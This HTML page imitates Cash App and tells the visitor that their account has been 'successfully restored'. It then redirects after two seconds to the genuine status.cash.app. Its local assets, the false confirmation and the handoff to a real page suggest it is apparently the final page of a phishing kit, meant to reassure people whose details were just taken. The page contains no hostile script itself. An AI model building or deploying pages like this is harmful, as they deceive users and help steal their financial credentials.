
<html>
<head>
<title>Cash App | Thank You</title>
<meta charset="utf-8">
<meta http-equiv = "refresh" content = "2; url =https://status.cash.app/" />
<link rel="icon" sizes="196x196" href="https://cash.app/icon-196.png">
<link rel="icon" href="https://cash.app/favicon.ico">
<link rel="mask-icon" href="https://cash.app/favicon-pinned.svg" color="#18C300">
<link rel="stylesheet" type="text/css" href="assets/css/cash.css" >
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

</head>
<!-------------------------- Body ----------------------------->
<body class="theme-bg ember-application theme-green" style="background-color:#32BC43">
<div id="ember308" class="ember-view"><div data-current-route="login" id="ember332" class="full-height application-cash ember-view">  <div id="ember339" class="cookie-banner ember-view"><!----></div>
  <section class="layout-login flex-container full-height pad">
  <div class="login-container flex-container flex-v-center flex-fill">
      <div id="ember596" class="login-onboarding ember-view"><!---->
  <p id="z" class="instructions "><span>Thank You for you using Cash App.<br><br>You have successfully restored your account.</span>
<Img src="assets/imgs/success.gif" style="height:300px"/>
</p>
</section>
</div>
  <!---->
  <div id="ember408" class="modal-manager ember-view"><div class="modal-overlay "></div>
<!----></div>
</div></div>

</body>

</html>